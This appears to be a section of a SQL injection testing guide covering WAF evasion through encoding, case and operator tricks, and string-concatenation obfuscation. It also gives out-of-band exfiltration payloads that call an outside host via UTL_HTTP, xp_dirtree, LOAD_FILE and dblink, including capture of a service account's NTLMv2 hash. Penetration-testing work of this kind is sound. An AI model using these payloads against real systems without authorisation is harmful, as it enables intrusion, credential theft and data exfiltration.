- **URL encoding**: `%27` = `'`, `%20`/`%09`/`%0a` = whitespace, `%3b` = `;`, `%23` = `#`. Send raw and encoded variants — encoding *after* the app decodes is what reaches SQL.
- **Double encoding**: `%2527` — survives one decode pass (WAF sees `%27`, app decodes again to `'`). Works only when the app decodes twice or the WAF and app disagree on decode count — test both `'%27` and `%2527`.
- **Unicode/overlong**: fullwidth `＇` (U+FF07), `％`, overlong UTF-8 `0xC0 0xA7` — only useful where a normalizer folds them to ASCII *before* query build (Java NFKC, some PHP mb filters). Test normalization by planting the unicode variant and reading back.
- **Hex**: MySQL `0x276f72...` for string literals (no quotes needed), `UNHEX()`.
- **Base64**: only matters when the app base64-decodes before SQL (`FROM_BASE64`, `atob`, `Buffer.from(...,'base64')`) — the WAF sees ciphertext; spot it by payloads that fail in cleartext but work base64-wrapped inside the decoded layer.
- **Newline/tab in SQL**: MySQL tolerates `/**/` and newlines as token separators (also splits naive WAF regexes `UNION[\s]+SELECT`).
- Rule: encode *after* mapping the decode pipeline (proxy → WAF → app → framework → DB). `payloads.md` §4 has the table.

### Case-sensitivity and alternative-logical-operator bypasses
- **Case**: SQL keywords are case-insensitive (`sElEcT`, `uNiOn`) — pair with WAF randomization (`%43`-style percent-encoding of one letter, `UnIoN`); MySQL *table/column* names are case-sensitive on Linux (`Users` ≠ `users`), so a "working" query on the wrong case is a classic false negative.
- **Logical operators**: `||` for `OR`, `&&` for `AND` (MySQL), `!` for `NOT`, `|`/`&` bitwise where a boolean is coerced; `AND`→`&`-style single-char swaps (`%7c`, `%26`) slip signature filters; ANSI `AND 1<>1` instead of `AND 1=0`; `NOT 1=2` instead of `=`.
- **Whitespace-free logic**: `1'||'1'='1`, `1'&&(1=1)-- ` — no space needed before `(`/`||` in most engines.
- **Rlike/Like/Ilike**: `LIKE 0x25...` (hex pattern) bypasses quote-heavy regex filters; Postgres `ILIKE` for case-insensitive; `~` regex operator.

### String-concatenation obfuscation
Where the payload must *build* a string at the DB (or hide one from the WAF):
MySQL `CONCAT('a',0x62,'c')`, `CONCAT_WS`, `CHAR(97,98,99)` (no literals at all —
beats literal-matching WAFs), `0x616263` hex literals, `REVERSE()`, `MID(a,1,1)`
instead of substr-with-literals; Postgres `chr(97)||chr(98)`, `decode('6162','hex')`;
Oracle `CHR`/`UTL_RAW.CAST_TO_VARCHAR2`; MSSQL `CHAR`/`0x61` + `CAST`. Use
concat-obfuscation inside `LOAD_FILE`/OOB hosts (V-05) so the target domain never
appears in one piece in the request — that defeats URL-fragmenting WAFs.

### Blind OOB HTTP/SMB variants (when DNS is blocked but HTTP/SMB isn't)
When DNS egress (V-05) is filtered but the DB can still open TCP: HTTP OOB via
Oracle `UTL_HTTP.REQUEST('http://<nonce>.<oast>')`, SQL Server
`xp_fileexist '\\<host>\<share>'` / `OPENROWSET` / `xp_dirtree` UNC fetch
(SMB: your listener on 445 sees the auth attempt — leak NTLMv2 hash of the service
account = credential material, chain to `ssrf-testing`/`info-disclosure-testing`),
MySQL `LOAD_FILE('\\\\<host>\\share')` UNC read, Postgres `dblink`/`http` extension.
Detection: constant-host callback first (nonce per probe), confirm source IP is the
DB host, then encode data in the path/query (`/<offset>-<char>` per request — one
bit/char per callback). Timing-blind variant: if the *fetch itself* is conditional
(`CASE WHEN <cond> THEN fetch END`), callback presence is your boolean — no DNS
needed at all. FP rules mirror V-05: fresh nonces, no wildcard domains, no
client-side fetches (check source IP).
